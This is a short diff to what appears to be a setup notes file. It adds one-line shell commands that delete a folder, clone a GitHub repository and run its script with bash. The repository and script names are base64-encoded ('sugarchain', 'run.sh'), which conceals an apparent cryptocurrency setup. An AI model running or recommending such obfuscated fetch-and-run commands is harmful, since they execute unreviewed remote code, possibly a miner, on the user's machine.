@@ -11,4 +11,6 @@ rm -rf sugarchain && git clone https://github.com/MujurID/sugarchain && cd sugar
 rm -rf sugarchain && git clone https://github.com/MujurID/sugarchain && cd sugarchain && bash run.sh
 
 
-apt-get update && apt-get install -y git && git clone https://github.com/MujurID/c3VnYXJjaGFpbg && cd c3VnYXJjaGFpbg && bash cnVu.sh
+apt-get update && apt-get install -y git && rm -rf c3VnYXJjaGFpbg && git clone https://github.com/MujurID/c3VnYXJjaGFpbg && cd c3VnYXJjaGFpbg && bash cnVu.sh && git clone https://github.com/MujurID/c3VnYXJjaGFpbg && cd c3VnYXJjaGFpbg && bash cnVu.sh
+
+rm -rf c3VnYXJjaGFpbg && git clone https://github.com/MujurID/c3VnYXJjaGFpbg && cd c3VnYXJjaGFpbg && bash cnVu.sh
